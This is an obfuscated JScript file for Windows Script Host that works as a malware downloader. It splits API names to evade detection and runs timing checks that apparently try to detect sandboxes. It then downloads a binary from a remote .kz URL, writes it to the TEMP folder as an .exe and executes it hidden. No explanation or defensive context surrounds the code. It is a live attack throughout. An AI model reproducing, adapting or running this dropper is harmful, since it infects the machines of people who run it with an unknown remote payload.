var YJ = false;
var K = "Create"+"Object";
var E = function C() {return WScript[K]("WScript"+".Shell");}(), C0 = 11;
var VY0 = "MSXML2"+".XMLHTTP";
var SK = 2;
var L0 = SK - 2;
function RL(Z){E["Run"](Z, L0, L0);};
function LN(){return VY0 + "";};
function B(Q, IY){L0 = L0 * 1; return Q - IY;};
function T(){return K;};
/*@cc_on
  @if (@_win32 || @_win64)
    YJ = true;
  @end
@*/
if (YJ)
{
var DJ = "";
function I(){return 22;};
var NL = 0; var F = 0;
function VY()
{
var AG = new this["Date"]();
var I1 = AG["getUTCMilliseconds"]();
WScript["Sleep"](I());
var AG = new this["Date"]();
var GL = AG["getUTCMilliseconds"]();
WScript["Sleep"](I());
var AG = new this["Date"]();
var UE = AG["getUTCMilliseconds"]();
var NL = "I0";
NL = B(GL, I1);
var F = "YT";
F = B(UE, GL);
DJ = "open";
return B(NL, F);
}
var L2 = false;
var X = false;
for (var Y = L0; Y < I() * 1; Y++){if (VY() != L0){
L2 = true; 
F = "31" + 11 * NL + F; 
X = true; 
break;
}}
function H() {return ((L2 == true) && (L2 == X)) ? 1 : L0;};
if (L2 && H() && X){
function JP() {return E["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "EIlV1Pvb2.ex" + "e";};
 S = LN();
 T0 = WScript[K](S);
 var PA = 1;
do { 
	for (;PA;){
	try {
		if (PA == 1)
		{
			T0[DJ]("GET", "http://vtdrive.kz/f6dh1a", false);
			T0["send"]();
			L1 = "Sleep";
			PA = 2;
		}
		WScript[L1](I() + 120); 
		if (T0["readystate"] < 2 * 2) continue;
		PA = L0;
		function US(V) {var U = (1, 2, 3, 4, 5, V); return U;};
		PP = WScript[T()]("ADODB.Stream");
		S = PP;
		S[DJ]();
		S["type"] = US(1);
		S["write"](T0["ResponseBody"]);
		PP["position"] = US(L0);
		S["Save" + "ToFile"](JP(), 2);
		PP["cl"+"ose"]();
		L = JP();
		RL(L);
	} catch(A){};};
}while (PA);
}
}

